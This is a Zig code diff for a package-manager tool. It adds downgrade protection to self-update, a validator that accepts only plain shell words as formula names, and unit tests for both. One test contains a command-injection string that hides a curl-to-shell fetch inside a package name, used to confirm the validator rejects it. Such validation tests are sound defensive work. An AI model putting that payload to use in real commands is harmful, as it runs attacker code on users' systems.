@@ -708,14 +708,23 @@ fn sha256File(path: []const u8) ![64]u8 {
     return std.fmt.bytesToHex(digest, .lower);
 }
 
+/// The version in `abv0 X.Y.Z (target)`, the first line `--version` prints.
+pub fn versionFromOutput(out: []const u8) ?[]const u8 {
+    const line = std.mem.sliceTo(out, '\n');
+    if (!std.mem.startsWith(u8, line, "abv0 ")) return null;
+    const rest = line["abv0 ".len..];
+    const v = rest[0 .. std.mem.indexOfAny(u8, rest, " \r") orelse rest.len];
+    if (v.len == 0 or !std.ascii.isDigit(v[0])) return null;
+    return v;
+}
+
 pub fn cmdSelfUpdate(
     a: std.mem.Allocator,
     st: *store.Store,
-    reg: ?*const registry.Registry,
+    current_version: []const u8,
     args: []const []const u8,
 ) !u8 {
     _ = st;
-    _ = reg;
     var check_only = false;
     for (args) |arg| {
         if (std.mem.eql(u8, arg, "--check")) {
@@ -818,6 +827,19 @@ pub fn cmdSelfUpdate(
     if (sanity.term != .Exited or sanity.term.Exited != 0) {
         std.fs.cwd().deleteFile(tmp_path) catch {};
         term.err("{s}error{s}: the new binary failed `--version`; the current binary is unchanged\n", .{ term.red, term.reset });
+        return 1;
+    }
+    // 4b. Never go back. An old SHA256SUMS keeps a valid signature forever, so
+    //     whoever can serve old release files could otherwise roll every user
+    //     back to a version with known holes.
+    const new_version = versionFromOutput(sanity.stdout) orelse {
+        std.fs.cwd().deleteFile(tmp_path) catch {};
+        term.err("{s}error{s}: the new binary does not report its version; the current binary is unchanged\n", .{ term.red, term.reset });
+        return 1;
+    };
+    if (registry.compareVersions(new_version, current_version) == .lt) {
+        std.fs.cwd().deleteFile(tmp_path) catch {};
+        term.err("{s}error{s}: the published build is {s}, older than this {s}; not downgrading\n", .{ term.red, term.reset, new_version, current_version });
         return 1;
     }
 
@@ -1671,6 +1693,15 @@ pub fn scanBrew(a: std.mem.Allocator, prefix: []const u8) !?[]BrewItem {
     return items;
 }
 
+/// A word a POSIX shell takes as it is: letters, digits and `@._+-`.
+pub fn isShellWord(s: []const u8) bool {
+    if (s.len == 0) return false;
+    for (s) |c| {
+        if (!std.ascii.isAlphanumeric(c) and c != '@' and c != '.' and c != '_' and c != '+' and c != '-') return false;
+    }
+    return true;
+}
+
 /// Find a cask in the catalog. Casks are apps: only a package with the same
 /// name counts, never one that merely ships a program of that name.
 pub fn matchCask(reg: *const registry.Registry, wanted: []const u8) ?Match {
@@ -2366,4 +2397,20 @@ test "addPins adds each name once" {
     try testing.expectEqual(@as(usize, 2), try addPins(aa, &st, &.{ "jq", "fd", "jq" }));
     try testing.expectEqual(@as(usize, 0), try addPins(aa, &st, &.{"fd"}));
     try testing.expect(isPinned(&st, aa, "jq") and isPinned(&st, aa, "fd"));
+}
+
+test "versionFromOutput reads the --version line" {
+    try testing.expectEqualStrings("2.6.0", versionFromOutput("abv0 2.6.0 (x86_64-linux)\n").?);
+    try testing.expectEqualStrings("3.0.0", versionFromOutput("abv0 3.0.0").?);
+    try testing.expect(versionFromOutput("evil 9.9.9\n") == null);
+    try testing.expect(versionFromOutput("abv0 (x)\n") == null);
+    try testing.expect(versionFromOutput("") == null);
+}
+
+test "isShellWord takes formula names and nothing a shell would act on" {
+    try testing.expect(isShellWord("python@3.12"));
+    try testing.expect(isShellWord("gtk+3"));
+    try testing.expect(!isShellWord("jq@;curl$IFS-s$IFS//x|sh"));
+    try testing.expect(!isShellWord("a`b`"));
+    try testing.expect(!isShellWord(""));
 }
